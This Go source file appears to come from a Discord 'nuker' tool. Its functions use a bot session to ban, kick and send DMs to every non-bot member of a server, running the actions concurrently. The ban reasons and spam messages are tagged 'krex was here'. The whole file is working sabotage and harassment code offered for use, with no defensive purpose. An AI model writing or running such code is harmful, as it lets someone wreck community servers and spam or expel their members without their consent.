package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

// NukeOptions holds configuration options for the server nuking process
type NukeOptions struct {
	BanAll  bool   // Whether to ban all members
	KickAll bool   // Whether to kick non-bannable members
	DmAll   bool   // Whether to DM all members before ban/kick
	DmMsg   string // Message to send in DMs
}

// Default nuke options
var DefaultNukeOptions = NukeOptions{
	BanAll:  false,
	KickAll: false,
	DmAll:   true,
	DmMsg:   "@everyone server got nuked by krex",
}

// BanAllMembers bans all members in a guild
func BanAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {
	// Get all members
	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	// Count how many members are bannable
	var bannableMembers []*discordgo.Member
	for _, member := range members {
		// Skip bots
		if member.User.Bot {
			continue
		}

		// Skip ourselves
		if member.User.ID == s.State.User.ID {
			continue
		}

		bannableMembers = append(bannableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Banning %d members...", len(bannableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(bannableMembers))

	for _, member := range bannableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			// DM the user before banning if enabled
			if options.DmAll {
				// Create DM channel
				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {
					// Send the DM message with a mention
					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			// Ban the user with a reason
			err := s.GuildBanCreateWithReason(guildID, m.User.ID, "krex was here", 0)
			if err != nil {
				// If banning fails and kick is enabled, try to kick
				if options.KickAll {
					err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
					if err != nil {
						// Just print error if both ban and kick fail
						printColoredLine(fmt.Sprintf("[!] Failed to ban/kick %s: %s", m.User.Username, err), colorRed)
						return
					}
					printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)
				}
			} else {
				printColoredLine(fmt.Sprintf("[+] Banned member: %s", m.User.Username), colorGreen)
			}

			// Add a small delay to avoid rate limiting
			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	// Wait for all ban operations to complete
	wg.Wait()
	printColoredLine("[+] Member ban/kick operations completed", colorGreen)
}

// KickAllMembers kicks all members from the guild
func KickAllMembers(s *discordgo.Session, guildID string, options NukeOptions) {
	// Get all members
	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	// Count how many members are kickable
	var kickableMembers []*discordgo.Member
	for _, member := range members {
		// Skip bots
		if member.User.Bot {
			continue
		}

		// Skip ourselves
		if member.User.ID == s.State.User.ID {
			continue
		}

		kickableMembers = append(kickableMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] Kicking %d members...", len(kickableMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(kickableMembers))

	for _, member := range kickableMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			// DM the user before kicking if enabled
			if options.DmAll {
				// Create DM channel
				dmChannel, err := s.UserChannelCreate(m.User.ID)
				if err == nil {
					// Send the DM message with a mention
					mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, options.DmMsg)
					_, _ = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
				}
			}

			// Kick the user with a reason
			err = s.GuildMemberDeleteWithReason(guildID, m.User.ID, "krex was here")
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to kick %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Kicked member: %s", m.User.Username), colorYellow)

			// Add a small delay to avoid rate limiting
			time.Sleep(100 * time.Millisecond)
		}(member)
	}

	// Wait for all kick operations to complete
	wg.Wait()
	printColoredLine("[+] Member kick operations completed", colorGreen)
}

// DmAllMembers sends DMs to all members in a guild
func DmAllMembers(s *discordgo.Session, guildID string, message string) {
	// Get all members
	members, err := s.GuildMembers(guildID, "", 1000)
	if err != nil {
		printColoredLine("[!] Error getting guild members: "+err.Error(), colorRed)
		return
	}

	// Filter out bots and ourselves
	var targetMembers []*discordgo.Member
	for _, member := range members {
		// Skip bots
		if member.User.Bot {
			continue
		}

		// Skip ourselves
		if member.User.ID == s.State.User.ID {
			continue
		}

		targetMembers = append(targetMembers, member)
	}

	printColoredLine(fmt.Sprintf("[*] DMing %d members...", len(targetMembers)), colorCyan)

	var wg sync.WaitGroup
	wg.Add(len(targetMembers))

	for _, member := range targetMembers {
		go func(m *discordgo.Member) {
			defer wg.Done()

			// Create DM channel
			dmChannel, err := s.UserChannelCreate(m.User.ID)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to create DM channel for %s: %s", m.User.Username, err), colorRed)
				return
			}

			// Send the DM message with a mention
			mentionMsg := fmt.Sprintf("<@%s> %s", m.User.ID, message)
			_, err = s.ChannelMessageSend(dmChannel.ID, mentionMsg)
			if err != nil {
				printColoredLine(fmt.Sprintf("[!] Failed to send DM to %s: %s", m.User.Username, err), colorRed)
				return
			}

			printColoredLine(fmt.Sprintf("[+] Sent DM to: %s", m.User.Username), colorGreen)

			// Add a small delay to avoid rate limiting
			time.Sleep(200 * time.Millisecond)
		}(member)
	}

	// Wait for all DM operations to complete
	wg.Wait()
	printColoredLine("[+] All DMs sent successfully", colorGreen)
}
